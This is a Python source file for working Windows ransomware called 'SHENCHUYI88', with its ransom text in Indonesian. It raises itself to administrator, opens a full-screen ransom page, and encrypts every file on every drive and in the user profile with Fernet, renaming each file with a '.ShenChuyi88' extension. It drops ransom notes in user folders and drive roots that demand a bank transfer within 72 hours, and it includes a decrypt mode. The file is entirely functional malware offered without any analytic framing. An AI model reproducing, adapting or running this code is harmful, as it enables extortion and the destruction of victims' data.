import pathlib
import secrets
import os
import base64
import getpass
import webbrowser
import tempfile
import time
import threading
import ctypes
import sys
import subprocess
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import winreg

RANSOM_NOTE = """
SEMUA FILE ANDA TELAH DIENKRIPSI!

Untuk mendekripsi file anda, transfer sebesar 3.000.000 IDR ke rekening berikut:

BANK: BCA
NOMOR REKENING: 1234567890
ATAS NAMA: SHENCHUYI88

Setelah pembayaran, kirim bukti transfer ke email: fatcatfatcat68@gmail.com
Anda akan menerima KEY DEKRIPSI setelah pembayaran diverifikasi.

PERINGATAN:
- Jangan mencoba mendekripsi sendiri
- Jangan mengganti ekstensi file
- Jangan menghapus file apapun
- Anda memiliki waktu 72 jam

KEY ANDA TELAH DISIMPAN DI SISTEM
HANYA KAMI YANG MEMILIKI KEY DEKRIPSI
"""

HTML_CONTENT = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SHENCHUYI88 RANSOMWARE</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #ff0000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            padding: 20px;
        }
        .container {
            background-color: #000000;
            border: 5px solid #ffffff;
            padding: 40px;
            max-width: 800px;
            width: 100%;
            text-align: center;
            box-shadow: 0 0 50px rgba(0,0,0,0.5);
        }
        .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 30px auto;
            display: block;
        }
        .logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        h1 {
            color: #ff0000;
            font-size: 32px;
            margin-bottom: 30px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .message {
            color: #ffffff;
            font-size: 18px;
            line-height: 1.6;
            margin-bottom: 30px;
            text-align: left;
            white-space: pre-line;
        }
        .warning {
            color: #ff0000;
            font-weight: bold;
            margin-top: 20px;
            font-size: 16px;
        }
        .footer {
            color: #888888;
            margin-top: 30px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://g.top4top.io/p_3786r7lze1.jpeg" alt="SHENCHUYI88">
        </div>
        <h1>SHENCHUYI88 RANSOMWARE</h1>
        <div class="message">
SEMUA FILE ANDA TELAH DIENKRIPSI!

Untuk mendekripsi file anda, transfer sebesar 3.000.000 IDR ke rekening berikut:

BANK: BCA
NOMOR REKENING: 1234567890
ATAS NAMA: SHENCHUYI88

Setelah pembayaran, kirim bukti transfer ke email: fatcatfatcat68@gmail.com
Anda akan menerima KEY DEKRIPSI setelah pembayaran diverifikasi.

PERINGATAN:
- Jangan mencoba mendekripsi sendiri
- Jangan mengganti ekstensi file
- Jangan menghapus file apapun
- Anda memiliki waktu 72 jam

KEY ANDA TELAH DISIMPAN DI SISTEM
HANYA KAMI YANG MEMILIKI KEY DEKRIPSI
        </div>
        <div class="warning">JANGAN MATIKAN KOMPUTER ANDA</div>
        <div class="footer">cmiwww</div>
    </div>
</body>
</html>
"""

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def show_html_ransom():
    temp_dir = tempfile.gettempdir()
    html_path = os.path.join(temp_dir, "SHENCHUYI88_RANSOM.html")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(HTML_CONTENT)
    webbrowser.open(f"file:///{html_path}")

def show_fullscreen_html():
    html_path = os.path.join(tempfile.gettempdir(), "SHENCHUYI88_RANSOM.html")
    with open(html_path, "w", encoding="utf-8") as f:
        f.write(HTML_CONTENT)
    
    try:
        os.system(f'start /MAX "" "{html_path}"')
    except:
        webbrowser.open(f"file:///{html_path}")

def create_ransom_note():
    desktop = os.path.expanduser("~/Desktop")
    documents = os.path.expanduser("~/Documents")
    downloads = os.path.expanduser("~/Downloads")
    
    paths = [desktop, documents, downloads, "C:\\", "D:\\", "E:\\", "F:\\"]
    
    for path in paths:
        try:
            if os.path.exists(path):
                note_path = os.path.join(path, "SHENCHUYI88_README.txt")
                with open(note_path, "w", encoding="utf-8") as f:
                    f.write(RANSOM_NOTE)
        except:
            pass

def generate_salt(size=16):
    return secrets.token_bytes(size)

def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())

def generate_key(password, salt):
    derived_key = derive_key(salt, password)
    return base64.urlsafe_b64encode(derived_key)

def encrypt_file(filename, key):
    try:
        f = Fernet(key)
        with open(filename, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(filename, "wb") as file:
            file.write(encrypted_data)
        new_name = filename + ".ShenChuyi88"
        os.rename(filename, new_name)
        return True
    except:
        return False

def encrypt_folder(foldername, key):
    count = 0
    try:
        for root, dirs, files in os.walk(foldername):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    if not file_path.endswith(".ShenChuyi88") and not file_path.endswith(".exe") and not file_path.endswith(".dll") and not file_path.endswith(".sys"):
                        if encrypt_file(file_path, key):
                            count += 1
                except:
                    pass
    except:
        pass
    return count

def get_all_drives():
    drives = []
    for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
        drive_path = f"{letter}:\\"
        if os.path.exists(drive_path):
            drives.append(drive_path)
    return drives

def encrypt_all_drives(key):
    total_encrypted = 0
    drives = get_all_drives()
    
    for drive in drives:
        try:
            total_encrypted += encrypt_folder(drive, key)
        except:
            pass
    
    user_profile = os.path.expanduser("~")
    try:
        total_encrypted += encrypt_folder(user_profile, key)
    except:
        pass
    
    return total_encrypted

def save_key_locally(key):
    try:
        key_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'system_key.bin')
        with open(key_path, 'wb') as f:
            f.write(key)
    except:
        pass

def decrypt_file(filename, key):
    try:
        if filename.endswith(".ShenChuyi88"):
            original_name = filename[:-12]
            f = Fernet(key)
            with open(filename, "rb") as file:
                encrypted_data = file.read()
            decrypted_data = f.decrypt(encrypted_data)
            with open(original_name, "wb") as file:
                file.write(decrypted_data)
            os.remove(filename)
            return True
    except:
        return False
    return False

def decrypt_folder(foldername, key):
    count = 0
    try:
        for root, dirs, files in os.walk(foldername):
            for file in files:
                try:
                    file_path = os.path.join(root, file)
                    if file_path.endswith(".ShenChuyi88"):
                        if decrypt_file(file_path, key):
                            count += 1
                except:
                    pass
    except:
        pass
    return count

def decrypt_all_drives(key):
    total_decrypted = 0
    drives = get_all_drives()
    for drive in drives:
        try:
            total_decrypted += decrypt_folder(drive, key)
        except:
            pass
    return total_decrypted

def main():
    run_as_admin()
    
    if len(sys.argv) > 1 and sys.argv[1] == "--decrypt":
        print("SHENCHUYI88 - DECRYPT MODE")
        password_input = getpass.getpass("Masukkan Key Dekripsi: ")
        salt_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'system_salt.bin')
        
        if os.path.exists(salt_path):
            with open(salt_path, "rb") as f:
                saved_salt = f.read()
            key = generate_key(password_input, saved_salt)
            print("Memulai dekripsi semua file...")
            decrypted = decrypt_all_drives(key)
            print(f"Dekripsi selesai. {decrypted} file berhasil didekripsi.")
            
            note_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'decrypt_complete.txt')
            with open(note_path, 'w') as f:
                f.write(f"File telah didekripsi. Total: {decrypted} files.")
        else:
            print("Key tidak valid atau file salt tidak ditemukan.")
        input("Tekan Enter untuk keluar...")
        return
    
    threading.Thread(target=show_fullscreen_html, daemon=True).start()
    time.sleep(1)
    
    fixed_password = "SHENCHUYI88_MASTER_KEY_2025_ULTRA_SECURE"
    salt = generate_salt(32)
    
    salt_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'system_salt.bin')
    with open(salt_path, "wb") as f:
        f.write(salt)
    
    key = generate_key(fixed_password, salt)
    
    save_key_locally(key)
    
    create_ransom_note()
    
    print("SHENCHUYI88 RANSOMWARE - MULAI ENKRIPSI")
    print("Mengenkripsi semua file di semua drive...")
    
    encrypted_count = encrypt_all_drives(key)
    
    print(f"Enkripsi selesai. {encrypted_count} file berhasil dienkripsi.")
    
    note_paths = []
    for drive in get_all_drives():
        note_path = os.path.join(drive, "SHENCHUYI88_README.txt")
        if os.path.exists(note_path):
            note_paths.append(note_path)
    
    print("SEMUA FILE TELAH DIENKRIPSI!")
    print("Ekstensi file berubah menjadi .ShenChuyi88")
    print("\nPEMBAYARAN: 3.000.000 IDR")
    print("EMAIL: fatcatfatcat68@gmail.com")
    print("\nKEY DEKRIPSI HANYA DIBERIKAN SETELAH PEMBAYARAN")
    
    time.sleep(5)

if __name__ == "__main__":
    main()